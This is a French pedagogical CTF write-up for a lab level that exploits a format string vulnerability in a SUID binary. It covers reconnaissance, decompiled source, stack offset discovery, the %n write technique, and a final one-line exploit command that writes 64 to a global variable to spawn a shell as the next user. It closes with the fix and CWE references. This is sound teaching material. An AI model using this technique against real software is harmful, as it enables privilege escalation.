# Level3 - README Pédagogique

## 🎯 Objectif
Exploiter une **format string vulnerability** pour écrire la valeur `64` dans la variable globale `m` et déclencher `system("/bin/sh")`.

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level3
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level4
```

### Tests comportementaux
```bash
$ ./level3
test
test

$ python -c "print('%x %x %x')" | ./level3
200 b7fd1ac0 b7ff37d0
```

**Observation** : Des valeurs hexadécimales s'affichent → **Format string vulnerability confirmée !**

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```c
#include <stdio.h>
#include <stdlib.h>

int m;  // Variable globale, initialisée à 0

void v(void)
{
    char local_20c[520];
    
    fgets(local_20c, 0x200, stdin);
    printf(local_20c);  // ⚠️ Format string vulnerability !
    
    if (m == 0x40) {    // Si m == 64
        fwrite("Wait what?!\n", 1, 0xc, stdout);
        system("/bin/sh");
    }
}

int main(void)
{
    v();
    return 0;
}
```

**Observations critiques** :
1. `printf(local_20c)` → Input utilisateur passé directement comme format string
2. Variable globale `m` à l'adresse `0x0804988c`
3. Si `m == 64` → `system("/bin/sh")` est appelé

---

## 💣 Vulnérabilité : Format String

### Qu'est-ce qu'une format string vulnerability ?

Elle apparaît quand l'input utilisateur est passé **directement** comme format à `printf()`.

```c
// ✅ Code sécurisé :
printf("%s", user_input);   // user_input traité comme STRING

// ❌ Code vulnérable :
printf(user_input);          // user_input traité comme FORMAT
```

**Conséquence** : Si l'utilisateur envoie `%x %x %x`, `printf()` va lire des valeurs sur la stack et les afficher. Avec `%n`, il peut même **écrire** en mémoire.

### Différence avec le buffer overflow

| | Buffer Overflow | Format String |
|---|---|---|
| **Cause** | Trop de données écrites | Format specifiers dans l'input |
| **Fonction vulnérable** | `gets()`, `strcpy()` | `printf()` |
| **Action** | Écrit au-delà du buffer | Lit/écrit des adresses arbitraires |
| **Level** | Level1, Level2 | Level3 |

---

## 🔑 Concepts clés

### 1. Les format specifiers

| Specifier | Rôle |
|-----------|------|
| `%d` | Affiche un entier décimal |
| `%x` | Affiche en hexadécimal |
| `%s` | Affiche une chaîne |
| `%p` | Affiche une adresse |
| `%n` | **Écrit** le compteur à une adresse ⚠️ |
| `%60x` | Affiche en hexa sur 60 caractères minimum |
| `%4$n` | Accès direct à la position 4 |

### 2. Le format specifier `%n`

**`%n` = Écrit le nombre de caractères affichés jusqu'ici dans une variable.**

```c
// Utilisation normale :
int compteur;
printf("Hello%n", &compteur);
// "Hello" = 5 caractères
// compteur = 5
```

**Pourquoi c'est dangereux ?**

Sans argument explicite, `printf()` va **chercher l'adresse sur la stack** :
```c
printf("AAAA%n");
// printf cherche l'adresse en position 1 sur la stack
// Écrit à cette adresse, peu importe ce qu'elle contient !
```

### 3. Le format specifier `%4$n`

**`$` = Accès direct à un argument par sa position.**

```
%4$n = "Va en position 4 sur la stack,
         traite cette valeur comme une adresse,
         et écris le compteur à cette adresse."
```

**Pourquoi `%4$n` et pas `%n` ?**

```
Avec %n seul :
→ printf lit séquentiellement : position 1, 2, 3...
→ On ne contrôle pas quelle position est utilisée

Avec %4$n :
→ printf saute directement à la position 4
→ On contrôle exactement où printf va lire l'adresse
```

### 4. Les variables globales en mémoire

**Une variable globale** est définie en dehors de toutes les fonctions.

**Où en mémoire ?**
```
0x08048000  ┌─────────────────┐
            │ .text           │ ← Code du programme
            ├─────────────────┤
            │ .rodata         │ ← Constantes
0x0804a000  ├─────────────────┤
            │ .data           │ ← Variables globales initialisées
            │ .bss            │ ← Variables globales NON initialisées ← m est ici !
0x0804b000  ├─────────────────┤
            │ Heap            │
            └─────────────────┘
```

**`m` est dans `.bss`** car c'est une variable globale non initialisée.
**Adresse fixe** : `0x0804988c` (pas d'ASLR sur les variables globales ici).

### 5. Trouver la position du buffer sur la stack

**Méthode** : Envoyer `AAAA` + plusieurs `%x` et chercher `41414141`.

```bash
python -c "print('AAAA' + '%x.'*10)" | ./level3
# AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825...
#                            ^^^^^^^^
#                            Position 4 ! C'est notre "AAAA"
```

**Pourquoi `41414141` ?**
```
'A' en ASCII = 0x41
"AAAA" = 0x41414141 ← Reconnaissable dans le dump hex
```

**Ce que ça signifie** :
- Notre buffer commence à la **position 4** sur la stack de `printf()`
- Les 4 premiers octets du payload sont donc en **position 4**
- → `%4$n` lira exactement ce qu'on a mis au début

### 6. Mécanisme d'écriture dans `m`

**Pourquoi mettre l'adresse au début du payload ?**

Quand `printf()` voit `%4$n` :
1. Il va lire la valeur en **position 4** sur la stack
2. Il traite cette valeur comme une **adresse**
3. Il écrit le compteur à cette adresse

```
Stack de printf() :
┌─────────────────────┐
│ Position 1          │ ← valeur interne
├─────────────────────┤
│ Position 2          │ ← valeur interne
├─────────────────────┤
│ Position 3          │ ← valeur interne
├─────────────────────┤
│ Position 4          │ ← Début de notre buffer = 0x0804988c (adresse de m)
├─────────────────────┤
│ Position 5          │ ← Suite du payload
└─────────────────────┘

%4$n lit position 4 = 0x0804988c
     → Écrit le compteur (64) à l'adresse 0x0804988c
     → m = 64 ✅
```

### 7. Contrôler la valeur écrite avec `%nx`

**`%n` écrit le NOMBRE DE CARACTÈRES affichés jusqu'à lui.**

**On contrôle ce nombre avec le padding `%Nx`** :

```
Payload : [adresse 4 octets] + [%60x] + [%4$n]

printf affiche :
1. L'adresse (4 caractères)     → compteur = 4
2. %60x (60 caractères)         → compteur = 64
3. %4$n → Écrit 64 dans m ✅
```

**Calcul du padding** :
```
Valeur à écrire   = 64
Octets déjà écrits = 4 (l'adresse)
Padding nécessaire = 64 - 4 = 60 → %60x
```

---

## 🚀 Construction du payload

### Étape 1 : Trouver l'adresse de `m`
```bash
# Dans Ghidra : cliquer sur la variable m dans v()
# Adresse : 0x0804988c
```

### Étape 2 : Trouver la position du buffer
```bash
python -c "print('AAAA' + '%x.'*10)" | ./level3
# 41414141 en position 4 → buffer en position 4
```

### Étape 3 : Calculer le padding
```
Valeur cible = 64 (0x40)
Adresse = 4 octets déjà affichés
Padding = 64 - 4 = 60 → %60x
```

### Étape 4 : Construire le payload
```
[Adresse de m en little-endian] + [%60x] + [%4$n]

Conversion de 0x0804988c :
  0x0804988c
    08 04 98 8c  (paires)
    8c 98 04 08  (inversé little-endian)
  → \x8c\x98\x04\x08
```

### Payload final
```
\x8c\x98\x04\x08 + %60x + %4$n
```

### Commande d'exploitation
```bash
(python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"; cat) | ./level3
```

**Note** : Le `\$` est nécessaire pour échapper le `$` dans le shell bash.

---

## 🔄 Déroulement de l'exploitation

```
1. fgets() lit notre payload dans local_20c

2. printf(local_20c) :
   a. Affiche \x8c\x98\x04\x08 (4 chars)
      Compteur interne : 4

   b. Affiche %60x (60 chars)
      Compteur interne : 64

   c. Lit %4$n :
      → Va en position 4 sur la stack
      → Trouve 0x0804988c (adresse de m)
      → Écrit 64 (compteur) à l'adresse 0x0804988c
      → m = 64 ✅

3. if (m == 0x40) → if (64 == 64) → TRUE !

4. system("/bin/sh") → Shell obtenu ! 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-134** : Use of Externally-Controlled Format String
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

**Technique d'exploitation** :
- **Format String Write** : Écriture arbitraire via `%n`

---

## 🎓 Résumé

1. **Vulnérabilité** : `printf(local_20c)` sans format string explicite
2. **Cible** : Variable globale `m` à l'adresse `0x0804988c`
3. **Technique** : Écrire 64 dans `m` via `%n`
4. **Payload** : `[adresse de m] + %60x + %4$n`
5. **Résultat** : `m == 64` → `system("/bin/sh")` → Shell level4

---

## 🔐 Comment corriger cette vulnérabilité ?

```c
// ❌ Vulnérable :
printf(local_20c);

// ✅ Sécurisé :
printf("%s", local_20c);
```

**Règle d'or** : Ne jamais passer une variable utilisateur directement comme format string à `printf()`.